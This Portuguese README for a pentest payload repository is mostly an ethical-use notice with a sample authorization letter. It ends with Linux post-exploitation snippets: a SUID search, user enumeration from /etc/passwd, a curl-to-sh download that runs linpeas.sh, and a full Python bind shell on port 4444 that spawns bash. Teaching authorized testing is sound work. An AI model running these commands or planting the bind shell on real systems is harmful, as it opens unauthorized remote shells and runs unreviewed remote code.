[![Uso Ético](https://img.shields.io/badge/usage-ethical--only-blue.svg)]
# PAYLOADS
Aviso de Uso Ético e Responsável

> Importante: Este repositório contém materiais destinados exclusivamente a testes autorizados de segurança (pentest) e fins educacionais. O conteúdo pode incluir exemplos e ferramentas voltadas à avaliação de segurança — não deve ser usado para atividades ilegais, não autorizadas ou maliciosas.




---

Finalidade

O objetivo deste projeto é auxiliar profissionais de segurança e estudantes a entender vetores, montar laboratórios controlados e realizar testes de intrusão em ambientes onde haja autorização explícita. Conteúdo e exemplos servem como recursos pedagógicos para melhorar práticas de defesa, detecção e mitigação.


---

Autorização obrigatória

Você deve ter autorização explícita, por escrito, do proprietário do sistema ou do ambiente alvo antes de executar qualquer código ou teste derivado deste repositório. Exemplos de ambientes aceitáveis:

Máquinas virtuais, containers ou laboratórios isolados de sua propriedade;

Plataformas de treinamento/CTF com permissão para testes;

Ambientes de clientes com contrato e autorização documentada.



---

Proibições

É proibido utilizar qualquer conteúdo deste repositório para:

Atacar, comprometer, modificar ou acessar sistemas sem permissão;

Realizar atividades que violem leis locais, nacionais ou termos de serviço de terceiros;

Criar persistência, backdoors ou mecanismos que facilitem o acesso não autorizado em sistemas alheios.



---

Aviso de responsabilidade

Este projeto pode conter exemplos que ilustram técnicas de exploração (por exemplo, demonstrações usando Python, manipulação de permissões e shells) apenas para fins de teste controlado. O mantenedor e contribuidores não se responsabilizam por qualquer uso indevido, perda, dano ou violação legal resultante do uso dos materiais aqui publicados.

Ao usar este repositório você concorda em assumir total responsabilidade pelas suas ações e a cumprir todas as leis aplicáveis.


---

Boas práticas recomendadas

Teste somente em ambientes isolados (VMs, snapshots, redes internas de laboratório).

Mantenha backups e procedimentos de recuperação antes de qualquer teste.

Documente autorização por escrito sempre que realizar testes em sistemas de terceiros.

Aplique mitigação e correções após testes e reporte vulnerabilidades de forma responsável ao proprietário do ativo.

Use controle de versões e revisões de código para auditar experimentos.



---

Modelo de autorização (exemplo)

> Autorização para Teste de Segurança (Exemplo)

Eu, [NOME DO PROPRIETÁRIO], na qualidade de proprietário/gestor do sistema [IDENTIFICAR SISTEMA/AMBIENTE], autorizo [NOME DO TESTADOR] a realizar testes de segurança (pentest) no escopo definido abaixo, nas datas [DATA INI] a [DATA FIM], de acordo com as condições e limitações descritas.

Escopo: [hosts/IPs, serviços, portas e limites]

Limitações: [ex.: sem DoS, sem manipular dados de produção, backup obrigatório]





> Observação: Este é apenas um modelo e não substitui orientação legal ou contratos formais. Para pentests profissionais, utilize contratos e termos específicos com suporte jurídico.




---

Reporte de vulnerabilidades

Se você identificar um comportamento perigoso, erro grave ou um possível risco dentro deste repositório, por favor reporte de forma privada para o mantenedor no e‑mail: [SEU_CONTATO_AQUI] para que possamos avaliar e corrigir rapidamente.


---

Diretrizes de contribuição

Contribuições são bem‑vindas desde que sigam as diretrizes de uso ético e não incluam material que incentive ou facilite atividades ilegais. Ao submeter conteúdo, garanta que ele:

Seja educacional e documentado com contexto e mitigação;

Não inclua payloads funcionais destinados ao uso em alvos não autorizados;

Esteja acompanhado de instruções claras de segurança e requisitos de autorização.







---
Code para localizar SUID: find / -perm-4000 2>/dev/null

list: GTFOBINS

users_bash: cut -d: -f1 /etc/passwd
# ou
getent passwd | cut -d: -f1
# ou (mostra também UID)
getent passwd | awk -F: '{printf "%-20s UID:%s\n",$1,$3}'

#baixa e utiliza limpezas.sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh







#!/usr/bin/env python3
# bind_shell.py
import socket, os, pty

HOST = "0.0.0.0"   # escuta em todas as interfaces
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
print(f"[+] Listening on {HOST}:{PORT} ...")
conn, addr = s.accept()
print(f"[+] Connection from {addr}")

# dup socket para stdin/out/err e abrir um pty para interatividade
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
pty.spawn("/bin/bash")

conn.close()
s.close()